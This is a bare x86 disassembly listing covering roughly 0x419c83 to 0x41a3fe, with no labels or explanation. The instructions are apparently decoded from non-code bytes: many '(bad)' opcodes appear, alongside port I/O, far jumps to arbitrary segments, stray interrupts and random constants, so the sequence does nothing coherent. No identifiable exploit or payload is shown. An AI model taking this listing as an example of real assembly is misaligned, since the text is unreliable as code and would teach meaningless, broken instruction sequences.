  419c83:	add    BYTE PTR [edi+eiz*1-0x6aeefb23],0x2a
  419c8b:	je     0x419d08
  419c8d:	dec    esp
  419c8e:	cmp    esi,DWORD PTR [edi+ecx*8+0x52]
  419c92:	pop    eax
  419c93:	in     eax,0xc1
  419c95:	popa   
  419c96:	xchg   esi,eax
  419c97:	cwde   
  419c98:	mov    bh,0x36
  419c9a:	shl    DWORD PTR [ebx-0x34b27bf0],cl
  419ca0:	sbb    dh,BYTE PTR [edi-0x302f5960]
  419ca6:	cmp    BYTE PTR [esp+esi*8],al
  419ca9:	pop    es
  419caa:	jbe    0x419cd3
  419cac:	out    0xf2,eax
  419cae:	inc    esp
  419caf:	push   ss
  419cb0:	inc    esp
  419cb1:	mov    dl,0x58
  419cb3:	inc    ebp
  419cb4:	pushf  
  419cb5:	fldcw  WORD PTR [edx]
  419cb7:	sbb    BYTE PTR [ecx+0x45],0xf8
  419cbb:	jb     0x419c8e
  419cbd:	imul   eax,DWORD PTR [ecx+edi*1+0x3257857c],0xffffffff
  419cc5:	pusha  
  419cc6:	adc    eax,0xc7e113a4
  419ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ccc:	adc    al,0xc3
  419cce:	out    0x94,eax
  419cd0:	mov    al,0x2e
  419cd2:	sub    DWORD PTR [edx],0xfffffff4
  419cd5:	cld    
  419cd6:	imul   esi,DWORD PTR [ecx-0x2986cc8e],0x6c
  419cdd:	push   ds
  419cde:	test   DWORD PTR [esi],ebp
  419ce0:	pop    ebp
  419ce1:	xchg   BYTE PTR ds:0xede343a0,bl
  419ce7:	sar    ah,0x19
  419cea:	mov    eax,DWORD PTR ds:0xceef7099
  419cf0:	int3   
  419cf1:	jae    0x419d2f
  419cf3:	dec    esi
  419cf4:	sbb    BYTE PTR [edi+0x5a],ah
  419cf7:	jp     0x419d42
  419cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cfa:	ds and al,0x15
  419cfd:	and    ebx,DWORD PTR [eax]
  419cff:	pop    edx
  419d00:	xor    ecx,DWORD PTR [edi+0x39eac3ec]
  419d06:	and    eax,0x1e118c22
  419d0b:	retf   
  419d0c:	std    
  419d0d:	add    ch,BYTE PTR ds:0x4d314bc8
  419d13:	cli    
  419d14:	mov    ebx,DWORD PTR [esi]
  419d16:	pop    ds
  419d17:	or     DWORD PTR [esi],eax
  419d19:	jae    0x419d55
  419d1b:	or     BYTE PTR [edx+0x6b],bh
  419d1e:	dec    ecx
  419d1f:	test   BYTE PTR [ecx+esi*4+0x6acb2231],cl
  419d26:	jb     0x419cd3
  419d28:	pop    ecx
  419d29:	pop    es
  419d2a:	add    BYTE PTR [ebx-0x75f15d73],bl
  419d30:	push   eax
  419d31:	into   
  419d32:	cmp    bh,BYTE PTR [edi-0x709ecd56]
  419d38:	mov    edi,0x5cb437c3
  419d3d:	add    al,0x51
  419d3f:	sbb    cl,BYTE PTR [ebx]
  419d41:	cmc    
  419d42:	fwait
  419d43:	bound  bp,DWORD PTR [ecx+0x4347de98]
  419d4a:	loopne 0x419ce1
  419d4c:	adc    cl,ah
  419d4e:	mov    ds:0x2315af11,al
  419d53:	xchg   edx,eax
  419d54:	dec    edx
  419d55:	div    ecx
  419d57:	mov    DWORD PTR [esi-0x6c],0x100cc2a4
  419d5e:	(bad)  
  419d60:	jb     0x419d53
  419d62:	iret   
  419d63:	loop   0x419d03
  419d65:	mov    bh,0xc4
  419d67:	(bad)
  419d6a:	jmp    0x419dbb
  419d6c:	xchg   ecx,eax
  419d6d:	arpl   WORD PTR [ecx-0xca76635],si
  419d73:	and    DWORD PTR [ecx+0x35],ebp
  419d76:	sub    ecx,eax
  419d78:	cmp    DWORD PTR [esi+0x4bc2bc92],0xffffffe5
  419d7f:	xchg   edi,eax
  419d80:	push   edi
  419d81:	test   eax,0x7be8495f
  419d86:	stc    
  419d87:	ds add dl,dl
  419d8a:	cwde   
  419d8b:	ret    0x27b3
  419d8e:	cmp    DWORD PTR [ecx],0x69
  419d91:	mov    esp,0xda7ed8ee
  419d96:	add    DWORD PTR [esi+0x3d153164],ecx
  419d9c:	sti    
  419d9d:	adc    al,0x2d
  419d9f:	dec    esi
  419da0:	data16 loope 0x419df8
  419da3:	cmp    DWORD PTR [esi],0x4d
  419da6:	ds fwait
  419da8:	aam    0xba
  419daa:	inc    ecx
  419dab:	call   0xb5ba141a
  419db0:	cwde   
  419db1:	pop    ecx
  419db2:	cmp    dh,BYTE PTR [esi-0x66b33279]
  419db8:	and    al,0x9d
  419dba:	add    edi,ebx
  419dbc:	inc    ebx
  419dbd:	ret    
  419dbe:	push   edx
  419dbf:	mov    dl,0x62
  419dc1:	lea    ebx,[eax+0x2f]
  419dc4:	je     0x419dfd
  419dc6:	loope  0x419d62
  419dc8:	xchg   edi,eax
  419dc9:	or     al,dh
  419dcb:	dec    BYTE PTR [ecx]
  419dcd:	cmc    
  419dce:	enter  0x2292,0x20
  419dd2:	dec    ecx
  419dd3:	jp     0x419e23
  419dd5:	test   DWORD PTR [ebp-0x39],0x4678c0b2
  419ddc:	(bad)  
  419ddd:	(bad)  
  419dde:	stc    
  419ddf:	and    DWORD PTR [eax+0x7],ecx
  419de2:	mov    ecx,0xba9b0cf8
  419de7:	inc    ebx
  419de8:	fwait
  419de9:	push   ss
  419dea:	outs   dx,DWORD PTR ds:[esi]
  419deb:	pop    ebp
  419dec:	lods   eax,DWORD PTR ds:[esi]
  419ded:	es pop esi
  419def:	fst    DWORD PTR [ebx-0x28]
  419df2:	inc    edx
  419df3:	mov    ds:0xfa7dfec,al
  419df8:	mov    al,0xcb
  419dfa:	neg    DWORD PTR [edi+0x31]
  419dfd:	inc    eax
  419dfe:	icebp  
  419dff:	(bad)  
  419e00:	aas    
  419e01:	xchg   esi,eax
  419e02:	aas    
  419e03:	jge    0x419d9d
  419e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e06:	mov    ds,WORD PTR [esi+0x4f4e4b15]
  419e0c:	ret    
  419e0d:	push   ds
  419e0e:	popa   
  419e0f:	mov    bh,0x6b
  419e11:	cmc    
  419e12:	jno    0x419da8
  419e14:	mov    eax,ds:0xdeae423a
  419e19:	pop    ebp
  419e1a:	or     eax,0x25faaab7
  419e1f:	push   edx
  419e20:	pop    ss
  419e21:	dec    edi
  419e22:	mov    WORD PTR [edi+0x35],es
  419e25:	cmp    dh,cl
  419e27:	fwait
  419e28:	std    
  419e29:	xchg   DWORD PTR [edx],ebp
  419e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e2c:	jns    0x419dce
  419e2e:	mov    BYTE PTR [eax+0x13],dl
  419e31:	js     0x419e94
  419e33:	lock fidivr DWORD PTR [edi-0x158fec88]
  419e3a:	in     eax,0x1c
  419e3c:	outs   dx,BYTE PTR ds:[esi]
  419e3d:	xlat   BYTE PTR ds:[ebx]
  419e3e:	outs   dx,BYTE PTR ds:[esi]
  419e3f:	mov    ebx,DWORD PTR [edx-0x210607d3]
  419e45:	call   0x87de:0x34a55ef7
  419e4c:	mov    ds:0x5ad3cb0a,al
  419e51:	(bad)  
  419e52:	inc    edx
  419e53:	sbb    eax,0x92cbd6aa
  419e58:	fs xor al,0xe3
  419e5b:	xor    eax,0x1948da2d
  419e60:	lods   al,BYTE PTR ds:[esi]
  419e61:	(bad)  
  419e62:	aad    0x30
  419e64:	push   es
  419e65:	test   eax,0xcf4ae0de
  419e6a:	rcr    bl,0xdd
  419e6d:	call   0x8789:0xa310ab6e
  419e74:	xchg   edi,eax
  419e75:	inc    ebx
  419e76:	ja     0x419e9a
  419e78:	inc    ebx
  419e79:	stos   DWORD PTR es:[edi],eax
  419e7a:	cli    
  419e7b:	in     al,dx
  419e7c:	xor    dl,cl
  419e7e:	repz or BYTE PTR [esi+0x22],ch
  419e82:	push   ds
  419e83:	pushf  
  419e84:	(bad)  
  419e85:	cld    
  419e86:	sub    eax,0x955f78fd
  419e8b:	lea    esp,[ecx-0x12eee6b2]
  419e91:	mov    ah,0x3d
  419e93:	pop    edx
  419e94:	scas   eax,DWORD PTR es:[edi]
  419e95:	fwait
  419e96:	popf   
  419e97:	and    ebx,edi
  419e99:	hlt    
  419e9a:	xchg   ebp,eax
  419e9b:	push   ss
  419e9c:	int    0xd4
  419e9e:	pushf  
  419e9f:	sbb    ecx,eax
  419ea1:	jne    0x419ea8
  419ea3:	dec    ebp
  419ea4:	retf   
  419ea5:	cmp    DWORD PTR [esi-0x1f],ebx
  419ea8:	sbb    BYTE PTR [ebx+eax*1-0x782c0940],cl
  419eaf:	icebp  
  419eb0:	inc    eax
  419eb1:	call   0xfa20:0xba2f109c
  419eb8:	mov    ah,bh
  419eba:	popa   
  419ebb:	sbb    eax,0x51ce302c
  419ec0:	push   0xffffff9d
  419ec2:	test   al,0x13
  419ec4:	inc    esi
  419ec5:	gs out dx,eax
  419ec7:	xchg   edi,eax
  419ec8:	nop
  419ec9:	xchg   edx,eax
  419eca:	sbb    al,0x9c
  419ecc:	out    dx,al
  419ecd:	adc    edi,edi
  419ecf:	adc    al,0xf0
  419ed1:	loope  0x419e95
  419ed3:	fcmovbe st,st(4)
  419ed5:	mov    ebx,0x9847eb5
  419eda:	nop
  419edb:	mov    ds:0x13e27a25,al
  419ee0:	inc    edx
  419ee1:	rcr    DWORD PTR [edi],cl
  419ee3:	ja     0x419e84
  419ee5:	ja     0x419e92
  419ee7:	test   al,0xac
  419ee9:	outs   dx,DWORD PTR ds:[esi]
  419eea:	(bad)  
  419eeb:	imul   esp,DWORD PTR [ebp-0x46c050a5],0xffffff9e
  419ef2:	ins    BYTE PTR es:[edi],dx
  419ef3:	inc    esp
  419ef4:	mov    esi,0x2cc38a6e
  419ef9:	iret   
  419efa:	fnsave [edi*1+0x669f0188]
  419f01:	or     DWORD PTR [eax+0x4fe9519e],eax
  419f07:	jecxz  0x419f02
  419f09:	xchg   ecx,eax
  419f0a:	xchg   ebp,eax
  419f0b:	jg     0x419f84
  419f0d:	dec    edi
  419f0e:	ja     0x419ee0
  419f10:	fdivr  st,st(3)
  419f12:	stos   DWORD PTR es:[edi],eax
  419f13:	test   BYTE PTR [esi+0x55fd154d],al
  419f19:	rcl    ah,cl
  419f1b:	push   esi
  419f1c:	rcl    cl,0x49
  419f1f:	mov    ds:0x53da6bb0,al
  419f24:	inc    ebx
  419f25:	(bad)  
  419f26:	stc    
  419f27:	mov    bl,0xd7
  419f29:	(bad)  [ebx-0x23]
  419f2c:	mov    esi,0x8854098f
  419f31:	mov    BYTE PTR [edi*2+0x257f3055],dl
  419f38:	rcl    DWORD PTR [eax+0x6ead8b6e],0x14
  419f3f:	xor    al,0xf4
  419f41:	sub    BYTE PTR [eax+0x457ac038],ch
  419f47:	imul   eax,ecx,0x455e587f
  419f4d:	sbb    DWORD PTR [ecx],0xf6ae0fb0
  419f53:	and    cl,cl
  419f55:	test   bh,bh
  419f57:	int    0x9b
  419f59:	xchg   ebp,eax
  419f5a:	aam    0x35
  419f5c:	mov    ebp,0xc32f60f0
  419f61:	rol    DWORD PTR [esi-0x5d],0x84
  419f65:	jmp    0x655a6959
  419f6a:	pushf  
  419f6b:	jge    0x419fcf
  419f6d:	fs pop edi
  419f6f:	dec    ecx
  419f70:	lahf   
  419f71:	loopne 0x419f7c
  419f73:	dec    eax
  419f74:	test   BYTE PTR [esi+0x46c24a63],al
  419f7a:	mov    bh,0x3f
  419f7c:	cwde   
  419f7d:	int3   
  419f7e:	stos   DWORD PTR es:[edi],eax
  419f7f:	jno    0x419f5a
  419f81:	mov    bh,0xd6
  419f83:	jno    0x419f52
  419f85:	xor    bh,ah
  419f87:	xchg   esi,eax
  419f88:	pop    ebx
  419f89:	xor    dl,BYTE PTR [edi]
  419f8b:	es mov edi,0x29d5913b
  419f91:	jno    0x419fcc
  419f93:	and    DWORD PTR [esi],0xfffffffa
  419f96:	jp     0x419f87
  419f98:	ins    DWORD PTR es:[edi],dx
  419f99:	jecxz  0x41a001
  419f9b:	mov    al,0xa4
  419f9d:	in     eax,dx
  419f9e:	xchg   ecx,eax
  419f9f:	jle    0x419f64
  419fa1:	jae    0x419f57
  419fa3:	pop    ds
  419fa4:	test   eax,0xf49e1ea6
  419fa9:	sbb    BYTE PTR [ecx+0x57],dl
  419fac:	xchg   edi,eax
  419fad:	stos   BYTE PTR es:[edi],al
  419fae:	(bad)  
  419faf:	jbe    0x419fe3
  419fb1:	cmp    BYTE PTR [eax],ah
  419fb3:	sbb    al,0xcc
  419fb5:	daa    
  419fb6:	inc    ebp
  419fb7:	loope  0x419f4b
  419fb9:	cmp    DWORD PTR [esi],ecx
  419fbb:	fxam   
  419fbd:	sbb    edx,DWORD PTR [eax]
  419fbf:	shr    DWORD PTR [ebx-0x2c],1
  419fc2:	cmp    eax,0x7fb72b72
  419fc7:	jae    0x41a00b
  419fc9:	call   0x36defd30
  419fce:	dec    eax
  419fcf:	inc    ecx
  419fd0:	push   cs
  419fd1:	sub    BYTE PTR [ebx*2+0x3ad6a648],dh
  419fd8:	inc    esp
  419fd9:	mov    eax,ds:0xf51bf279
  419fde:	shl    bl,0x66
  419fe1:	ja     0x41a006
  419fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe4:	frstor [edi+edi*2-0x4e]
  419fe8:	xchg   esp,eax
  419fe9:	mov    eax,0x50daf899
  419fee:	add    al,0xdb
  419ff0:	sub    ebx,DWORD PTR ds:0xbc4f3671
  419ff6:	xor    DWORD PTR [ebp-0x16],0x239d9975
  419ffd:	rcl    DWORD PTR [edx+edx*8-0x54],cl
  41a001:	xor    al,0x4d
  41a003:	and    dh,BYTE PTR [ebx-0x34]
  41a006:	ss xor eax,0x7707a5d
  41a00c:	add    BYTE PTR [ebx],0xcc
  41a00f:	out    0xdd,al
  41a011:	pop    edx
  41a012:	or     eax,ebx
  41a014:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41a016:	(bad)  [esi+0xcbd012]
  41a01c:	mov    ah,0x9d
  41a01e:	pop    esi
  41a01f:	pusha  
  41a020:	imul   ebx,ebp,0xfb45bda9
  41a026:	fistp  QWORD PTR [edi]
  41a028:	outs   dx,DWORD PTR ds:[esi]
  41a029:	or     bl,BYTE PTR [ecx-0x4d]
  41a02c:	jecxz  0x419fd7
  41a02e:	dec    edx
  41a02f:	outs   dx,BYTE PTR es:[esi]
  41a031:	repnz pushf 
  41a033:	aas    
  41a034:	xchg   esp,eax
  41a035:	mov    bh,0xdc
  41a037:	cli    
  41a038:	mov    eax,ds:0x3c2d7ab
  41a03d:	adc    edx,0xffffffa0
  41a040:	loop   0x41a075
  41a042:	and    al,0x21
  41a044:	dec    ebx
  41a045:	iret   
  41a046:	les    eax,FWORD PTR [esi+0x4e8b5d51]
  41a04c:	adc    al,0x7d
  41a04e:	cmp    esp,DWORD PTR [ebx]
  41a050:	in     al,0x8c
  41a052:	(bad)  
  41a053:	mov    esp,0x2adfa25e
  41a058:	xor    edi,ecx
  41a05a:	mov    edx,0x5a65bef
  41a05f:	loope  0x41a01c
  41a061:	mov    BYTE PTR [edx+eiz*4],dh
  41a064:	pusha  
  41a065:	mov    ds:0x9e018c5,al
  41a06a:	mov    DWORD PTR [ecx+0x7c],ecx
  41a06d:	adc    DWORD PTR [edi+edi*1+0x229d1754],edi
  41a074:	xchg   edi,eax
  41a075:	daa    
  41a076:	mov    ?,WORD PTR [esp+ecx*8+0x56b5b374]
  41a07d:	xor    dl,BYTE PTR [ecx]
  41a07f:	gs or  eax,eax
  41a082:	add    ah,BYTE PTR [ecx+0x44]
  41a085:	pop    edx
  41a086:	pusha  
  41a087:	pop    esp
  41a088:	out    dx,al
  41a089:	addr16 popf 
  41a08b:	xor    bl,0x7e
  41a08e:	dec    eax
  41a08f:	sbb    ax,0x3f4e
  41a093:	lahf   
  41a094:	sub    al,0xfd
  41a096:	mov    edi,DWORD PTR [edx]
  41a098:	sbb    BYTE PTR [eax],cl
  41a09a:	mov    WORD PTR [edx-0x59dd2fd1],cs
  41a0a0:	sbb    BYTE PTR [edx-0x4fd0d5af],bh
  41a0a6:	push   ds
  41a0a7:	out    0x6d,eax
  41a0a9:	scas   al,BYTE PTR es:[edi]
  41a0aa:	push   ss
  41a0ab:	stos   DWORD PTR es:[edi],eax
  41a0ac:	imul   ebp,eax,0x13
  41a0af:	jbe    0x41a03c
  41a0b1:	pop    ebx
  41a0b2:	cmp    al,0x92
  41a0b4:	xchg   edx,eax
  41a0b5:	popa   
  41a0b6:	mov    ch,0x71
  41a0b8:	es add eax,0x13c94aed
  41a0be:	or     BYTE PTR [ecx-0xc],0xc7
  41a0c2:	cmp    bh,BYTE PTR [ebp-0x27]
  41a0c5:	ins    BYTE PTR es:[edi],dx
  41a0c6:	ins    BYTE PTR es:[edi],dx
  41a0c7:	sub    esp,0xb1878dc0
  41a0cd:	test   bh,0x6e
  41a0d0:	mov    esi,0x295de62d
  41a0d5:	mov    DWORD PTR [esi+eiz*2-0x74f05583],edi
  41a0dc:	mov    ebx,ebx
  41a0de:	fistp  WORD PTR [ecx-0x3f]
  41a0e1:	add    DWORD PTR [ebx+ebp*4+0x3],edi
  41a0e5:	mov    ds:0x139f2ae6,eax
  41a0ea:	pop    edi
  41a0eb:	jbe    0x41a0d2
  41a0ed:	xchg   BYTE PTR [edx-0x7794de5b],ch
  41a0f3:	stc    
  41a0f4:	jecxz  0x41a0f1
  41a0f6:	(bad)  
  41a0f7:	mov    DWORD PTR [esi-0x4e46271a],ecx
  41a0fd:	inc    ebx
  41a0fe:	cli    
  41a0ff:	call   DWORD PTR [edi]
  41a101:	mov    dh,0x74
  41a103:	in     eax,0x3
  41a105:	mul    BYTE PTR [ebx+ecx*8-0x5e6362fb]
  41a10c:	and    bh,BYTE PTR [ecx]
  41a10e:	cs jb  0x41a146
  41a111:	test   BYTE PTR [ebx],bh
  41a113:	push   esi
  41a114:	push   ds
  41a115:	adc    DWORD PTR [ecx+0x37e5e0a0],ebp
  41a11b:	jmp    0x7fee:0x194ccfbd
  41a122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a123:	popa   
  41a124:	daa    
  41a125:	push   edx
  41a126:	pusha  
  41a127:	sbb    al,0x73
  41a129:	xor    cl,bl
  41a12b:	stos   DWORD PTR es:[edi],eax
  41a12c:	and    eax,0xc1e2fc2c
  41a131:	test   eax,0x15caa053
  41a136:	dec    eax
  41a137:	pop    esp
  41a138:	leave  
  41a139:	mov    eax,ds:0xedfbc14a
  41a13e:	cmc    
  41a13f:	ret    
  41a140:	loop   0x41a162
  41a142:	mov    DWORD PTR [ebp-0x44],edi
  41a145:	xor    BYTE PTR [esi],dl
  41a147:	jb     0x41a0d8
  41a149:	std    
  41a14a:	dec    esi
  41a14b:	dec    eax
  41a14c:	(bad)  
  41a14d:	mov    dl,0xc7
  41a14f:	sub    eax,0xfb7eb18f
  41a154:	xor    ebx,eax
  41a156:	clc    
  41a157:	xor    BYTE PTR [eax+0x1c24b41a],dl
  41a15d:	mov    ds:0x2cd0dea7,eax
  41a162:	or     eax,0xe550ce6f
  41a167:	call   0xed10:0x9bb5cfaf
  41a16e:	fisubr DWORD PTR [esp+ebx*2]
  41a171:	push   ds
  41a172:	xor    DWORD PTR [ebp+0x68],esi
  41a175:	test   DWORD PTR [ebp+0x2a],esp
  41a178:	sahf   
  41a179:	mov    ecx,0x11e8681
  41a17e:	call   0xd5af:0x12977041
  41a185:	(bad)  
  41a187:	fsubr  DWORD PTR [ebp-0x632a8fb3]
  41a18d:	rcr    DWORD PTR [eax-0x3e],cl
  41a190:	jmp    0xee60:0x882bd4ba
  41a197:	pushf  
  41a198:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41a19a:	inc    edi
  41a19b:	or     ebp,ebp
  41a19d:	mov    DWORD PTR [edx-0x3a],edi
  41a1a0:	mov    ?,WORD PTR [ebp+0x48]
  41a1a3:	shl    DWORD PTR [edi],cl
  41a1a5:	fdivr  QWORD PTR [ebp+0x556c6895]
  41a1ab:	fsubr  DWORD PTR [ebx+0x6e]
  41a1ae:	adc    eax,0x2612ae49
  41a1b3:	retf   
  41a1b4:	mov    ebx,0x82479b3d
  41a1b9:	rcr    BYTE PTR [edi-0x30],0x1b
  41a1bd:	sub    eax,0xfd9ae393
  41a1c2:	mov    al,0xf4
  41a1c4:	adc    al,ch
  41a1c6:	and    al,0x29
  41a1c8:	xchg   esp,eax
  41a1c9:	jle    0x41a229
  41a1cb:	sbb    eax,0x633d4a6b
  41a1d0:	div    DWORD PTR [eax-0x3d]
  41a1d3:	out    0x84,eax
  41a1d5:	sbb    BYTE PTR [esi-0x58],dh
  41a1d8:	ja     0x41a17a
  41a1da:	xlat   BYTE PTR ds:[ebx]
  41a1db:	sar    BYTE PTR [ebx],1
  41a1dd:	mov    esp,0xd718808
  41a1e2:	lods   eax,DWORD PTR ds:[esi]
  41a1e3:	aas    
  41a1e4:	dec    ecx
  41a1e5:	sub    eax,0x401503da
  41a1ea:	idiv   BYTE PTR [edi+edi*1]
  41a1ed:	pop    esi
  41a1ee:	sbb    eax,0x13b32e95
  41a1f3:	push   ss
  41a1f4:	push   DWORD PTR [esi-0x6ed08461]
  41a1fa:	xchg   BYTE PTR [edi],ch
  41a1fc:	aaa    
  41a1fd:	dec    ecx
  41a1fe:	xchg   ebx,eax
  41a1ff:	leave  
  41a200:	push   eax
  41a201:	jmp    0xb6890539
  41a206:	inc    BYTE PTR [esi-0x39fd1fd1]
  41a20c:	loopne 0x41a1a3
  41a20e:	test   esp,esp
  41a210:	cmp    eax,0x9d88dc64
  41a215:	clc    
  41a216:	call   DWORD PTR [edx]
  41a218:	cmp    eax,0xc66131fa
  41a21d:	stos   BYTE PTR es:[edi],al
  41a21e:	jmp    0x41a24c
  41a220:	aas    
  41a221:	or     eax,0x3237ab5e
  41a226:	fstp   TBYTE PTR [eax-0x6a9429ee]
  41a22c:	push   ss
  41a22d:	fisttp WORD PTR [eax+0x71bc3b62]
  41a233:	retf   0xabfd
  41a236:	dec    edi
  41a237:	lods   eax,DWORD PTR ds:[esi]
  41a238:	push   ds
  41a239:	loope  0x41a298
  41a23b:	out    dx,eax
  41a23c:	mov    bl,0xc5
  41a23e:	pop    ds
  41a23f:	mov    ch,0x91
  41a241:	iret   
  41a242:	xchg   ebx,eax
  41a243:	arpl   WORD PTR [edx-0x238ca85c],si
  41a249:	lods   al,BYTE PTR ds:[esi]
  41a24a:	push   esp
  41a24b:	mov    BYTE PTR [ebx-0x2f],bl
  41a24e:	dec    si
  41a250:	inc    ebx
  41a251:	out    dx,eax
  41a252:	sub    bl,ah
  41a254:	daa    
  41a255:	jbe    0x41a20f
  41a257:	jae    0x41a241
  41a259:	ins    BYTE PTR es:[edi],dx
  41a25a:	cmp    dl,bl
  41a25c:	pop    ds
  41a25d:	pushf  
  41a25e:	enter  0xaaa0,0x6c
  41a262:	or     al,0x4
  41a264:	das    
  41a265:	xor    ecx,DWORD PTR [edx-0x59]
  41a268:	pop    ss
  41a269:	test   ebp,edx
  41a26b:	xchg   ecx,eax
  41a26c:	jmp    0x7bf9:0xf312331d
  41a273:	stos   DWORD PTR es:[edi],eax
  41a274:	push   esi
  41a275:	inc    ecx
  41a276:	dec    esp
  41a277:	lock cmc 
  41a279:	mov    cl,0x54
  41a27b:	adc    ebx,esi
  41a27d:	dec    ebp
  41a27e:	aas    
  41a27f:	loopne 0x41a2ba
  41a281:	das    
  41a282:	pusha  
  41a283:	cmp    al,dh
  41a285:	xchg   edx,eax
  41a286:	mov    cl,dl
  41a288:	mov    ch,0xee
  41a28a:	sub    edi,eax
  41a28c:	or     al,0xeb
  41a28e:	mov    ecx,DWORD PTR [edi+0x6089846c]
  41a294:	(bad)  
  41a295:	neg    DWORD PTR [ebx]
  41a297:	stos   DWORD PTR es:[edi],eax
  41a298:	hlt    
  41a299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a29a:	sar    BYTE PTR [edx+0x1ee54442],0xdc
  41a2a1:	idiv   DWORD PTR [esi]
  41a2a3:	inc    edx
  41a2a4:	ss sbb eax,0x1cef410c
  41a2aa:	xchg   DWORD PTR [edx-0x7858c2ee],ebp
  41a2b0:	adc    esi,ebx
  41a2b2:	mov    DWORD PTR [edi+ebp*8+0x4d29d4cf],edi
  41a2b9:	push   ds
  41a2ba:	add    ebp,ebp
  41a2bc:	ins    BYTE PTR es:[edi],dx
  41a2bd:	jmp    0x41a301
  41a2bf:	or     edi,ebp
  41a2c1:	push   0x33baf8d9
  41a2c6:	push   0xb6757a60
  41a2cb:	inc    esi
  41a2cc:	or     eax,0xed613e1d
  41a2d1:	mov    cl,0x8
  41a2d3:	and    eax,0x5b4aefa
  41a2d8:	xlat   BYTE PTR ds:[ebx]
  41a2d9:	popf   
  41a2da:	mov    ah,0x49
  41a2dc:	gs jno 0x41a2f7
  41a2df:	xchg   esp,eax
  41a2e0:	test   ah,cl
  41a2e2:	add    DWORD PTR [ebx-0x2eda0616],esi
  41a2e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2e9:	in     al,dx
  41a2ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2eb:	jecxz  0x41a30a
  41a2ed:	leave  
  41a2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ef:	inc    ebx
  41a2f0:	js     0x41a31a
  41a2f2:	dec    ebp
  41a2f3:	or     eax,0xd2d1a2fb
  41a2f8:	daa    
  41a2f9:	je     0x41a329
  41a2fb:	retf   0x2336
  41a2fe:	outs   dx,BYTE PTR ds:[esi]
  41a2ff:	gs jl  0x41a312
  41a302:	rcl    BYTE PTR [esp+esi*4+0x3f],0x45
  41a307:	dec    esp
  41a308:	in     al,dx
  41a309:	and    al,0x4e
  41a30b:	push   esi
  41a30c:	dec    esi
  41a30d:	cmp    al,cl
  41a30f:	jge    0x41a34a
  41a311:	pop    edx
  41a312:	push   edi
  41a313:	lds    eax,FWORD PTR [ebx+0x63]
  41a316:	hlt    
  41a317:	add    al,0x1e
  41a319:	mov    ah,0x13
  41a31b:	(bad)  
  41a31c:	mov    esp,0xb3961df
  41a321:	jmp    0xed2f:0x7367f7ee
  41a328:	push   esp
  41a329:	pop    ebp
  41a32a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a32b:	int3   
  41a32c:	mov    ds:0xf9613cdd,eax
  41a331:	xchg   edx,eax
  41a332:	mov    dl,al
  41a334:	push   esi
  41a335:	add    eax,0x8baf8e77
  41a33a:	test   eax,0x59302e1c
  41a33f:	cmp    ecx,DWORD PTR [edi+esi*4+0x75]
  41a343:	outs   dx,BYTE PTR ds:[esi]
  41a344:	pop    eax
  41a345:	ins    DWORD PTR es:[edi],dx
  41a346:	xor    al,0xd0
  41a348:	js     0x41a39a
  41a34a:	cli    
  41a34b:	or     BYTE PTR [esi],0x23
  41a34e:	pop    ebp
  41a34f:	add    BYTE PTR [ecx-0x6e],ah
  41a352:	and    esi,edi
  41a354:	mov    WORD PTR [ebx+0x7e7aa16d],?
  41a35a:	cmp    BYTE PTR [ebx+0x7d6f903d],dl
  41a360:	mov    bl,0xc8
  41a362:	xchg   esp,eax
  41a363:	repnz ds adc al,0x41
  41a367:	jecxz  0x41a368
  41a369:	int    0xf4
  41a36b:	mov    eax,0x87340cbb
  41a370:	xchg   ebx,eax
  41a371:	pop    esi
  41a372:	cmp    DWORD PTR [ecx-0x7e5c6c9],0x85e56a1e
  41a37c:	dec    esi
  41a37d:	sbb    eax,0x7b67c5a5
  41a382:	test   al,0xda
  41a384:	call   0xaa300aa
  41a389:	ficom  DWORD PTR [esi-0x5d62d18e]
  41a38f:	dec    edx
  41a390:	add    al,0xcb
  41a392:	xchg   BYTE PTR [ecx+0x25],cl
  41a395:	dec    esi
  41a396:	add    esi,eax
  41a398:	add    ebx,esi
  41a39a:	test   al,0xfc
  41a39c:	inc    esp
  41a39d:	push   edi
  41a39e:	retf   
  41a39f:	pop    ecx
  41a3a0:	fs test al,0x17
  41a3a3:	adc    BYTE PTR [edx],al
  41a3a5:	or     esp,DWORD PTR [edx+0x390d6e37]
  41a3ab:	dec    ebp
  41a3ac:	(bad)  
  41a3ad:	cld    
  41a3ae:	ins    DWORD PTR es:[edi],dx
  41a3af:	jg     0x41a3fc
  41a3b1:	cmp    bl,0xb
  41a3b4:	(bad)  
  41a3b5:	adc    al,0x5e
  41a3b7:	inc    edi
  41a3b8:	adc    DWORD PTR [edx+0xd],edi
  41a3bb:	inc    eax
  41a3bc:	push   ebx
  41a3bd:	int    0x6a
  41a3bf:	fs hlt 
  41a3c1:	in     eax,0x36
  41a3c3:	imul   eax,DWORD PTR [ebx+ebp*4-0x26],0x79
  41a3c8:	test   bh,ah
  41a3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3cb:	ss push eax
  41a3cd:	adc    esp,DWORD PTR [edx-0x44]
  41a3d0:	or     edi,edx
  41a3d2:	repz jecxz 0x41a3bc
  41a3d5:	and    al,0xc3
  41a3d7:	cmp    dl,BYTE PTR [eax+edx*4]
  41a3da:	pop    ss
  41a3db:	mov    ebp,0xef63d929
  41a3e0:	and    edi,DWORD PTR [ecx-0x19]
  41a3e3:	sub    BYTE PTR [esi],dh
  41a3e5:	fs xchg ebp,eax
  41a3e7:	sub    esi,DWORD PTR [ebx-0x658fcd94]
  41a3ed:	push   es
  41a3ee:	push   0x660dfe0d
  41a3f3:	and    edi,DWORD PTR [esi+esi*2]
  41a3f6:	cs jmp 0x41a3a1
  41a3f9:	loop   0x41a3de
  41a3fb:	push   cs
  41a3fc:	mov    cl,0x83
  41a3fe:	jae    0x41a39f
